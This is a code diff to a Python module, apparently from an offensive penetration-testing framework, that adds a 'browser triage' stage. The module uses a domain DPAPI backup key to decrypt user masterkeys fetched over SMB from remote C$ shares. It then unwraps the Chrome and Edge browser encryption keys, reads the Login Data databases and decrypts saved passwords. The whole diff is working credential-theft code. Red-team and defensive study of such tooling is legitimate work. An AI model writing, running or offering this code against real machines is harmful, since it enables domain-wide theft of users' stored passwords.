@@ -1,4 +1,4 @@
-"""DPAPI crypto shared by the dpapi_* modules (stage 1-3).
+"""DPAPI crypto shared by the dpapi_* modules (stages 1-4).
 
 Stage 1 (dpapi_backupkey) pulls the domain backup key pair; stages 2-3
 spend it here. Third-party imports (impacket, Cryptodome) are
@@ -143,3 +143,113 @@ def credential_fields(blob):
     except UnicodeDecodeError:
         secret = raw_secret.hex()  # not really text — show the bytes
     return target, username, secret
+
+
+# -- browser triage (stage 4) -----------------------------------------------
+
+# browser name -> profile-data dir, relative to a user's profile root
+BROWSER_DIRS = {
+    "chrome": r"AppData\Local\Google\Chrome\User Data",
+    "edge": r"AppData\Local\Microsoft\Edge\User Data",
+}
+
+
+def build_masterkey_map(conn, user_dir, backup_key, err_cb=None):
+    """{guid: masterkey} for one profile, read over SMB: every guid file
+    under AppData\\Roaming\\Microsoft\\Protect\\<sid>\\ that the backup
+    key unwraps. err_cb (e.g. a module's print_debug) gets per-file
+    failures; silent otherwise."""
+    masterkeys = {}
+    protect = f"Users\\{user_dir}\\AppData\\Roaming\\Microsoft\\Protect"
+    for sid_dir in _smb_list(conn, f"{protect}\\*"):
+        if not sid_dir.startswith("S-"):
+            continue
+        for entry in _smb_list(conn, f"{protect}\\{sid_dir}\\*"):
+            if not is_guid_name(entry):
+                continue
+            data = _smb_read(conn, f"{protect}\\{sid_dir}\\{entry}")
+            if data is None:
+                continue
+            try:
+                guid, mk = decrypt_masterkey_file(data, backup_key)
+            except Exception as e:
+                if err_cb is not None:
+                    err_cb(f"{user_dir}/{entry}: {e}")
+                continue
+            if mk is not None:
+                masterkeys[entry.lower()] = mk
+    return masterkeys
+
+
+def _smb_list(conn, pattern):
+    try:
+        return [f.get_longname() for f in conn.listPath("C$", pattern)]
+    except Exception:
+        return []
+
+
+def _smb_read(conn, path):
+    try:
+        buf = []
+        conn.getFile("C$", path, buf.append)
+        return b"".join(buf)
+    except Exception:
+        return None
+
+
+def decrypt_browser_key(local_state, masterkeys):
+    """32-byte AES key out of a browser's Local State JSON: the
+    os_crypt.encrypted_key value is base64 of b"DPAPI" + a DPAPI_BLOB,
+    unwrapped with the profile's masterkey (matched by GuidMasterKey).
+    None when the key doesn't fit."""
+    import base64
+    import json
+    from impacket import dpapi
+    from impacket.uuid import bin_to_string
+    try:
+        state = json.loads(local_state.decode("utf-8", "replace"))
+        raw = base64.b64decode(state["os_crypt"]["encrypted_key"])
+    except Exception:
+        return None
+    if not raw.startswith(b"DPAPI"):
+        return None
+    blob = dpapi.DPAPI_BLOB(raw[len(b"DPAPI"):])
+    guid = bin_to_string(blob["GuidMasterKey"]).lower()
+    key = masterkeys.get(guid)
+    if key is None:
+        return None
+    try:
+        return blob.decrypt(key)
+    except ValueError:
+        return None  # wrong key: ciphertext garbage fails unpad
+
+
+def parse_login_data(data):
+    """(origin_url, username, password_blob) rows out of a Login Data
+    sqlite (read into memory — no journal/WAL handling needed for a
+    closed database)."""
+    import sqlite3
+    conn = sqlite3.connect(":memory:")
+    conn.deserialize(data)
+    try:
+        return conn.execute(
+            "SELECT origin_url, username_value, password_value "
+            "FROM logins").fetchall()
+    finally:
+        conn.close()
+
+
+def decrypt_browser_login(blob, aes_key):
+    """Plaintext out of a v10 password blob: b"v10" + 12-byte nonce +
+    AES-256-GCM(ciphertext + 16-byte tag). None for anything else (v20
+    app-bound can't be opened off-box by design) or a failed tag."""
+    from Cryptodome.Cipher import AES
+    if not blob or bytes(blob[:3]) != b"v10":
+        return None
+    blob = bytes(blob)
+    nonce, ct = blob[3:15], blob[15:]
+    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
+    try:
+        return cipher.decrypt_and_verify(ct[:-16], ct[-16:])
+    except ValueError:
+        return None
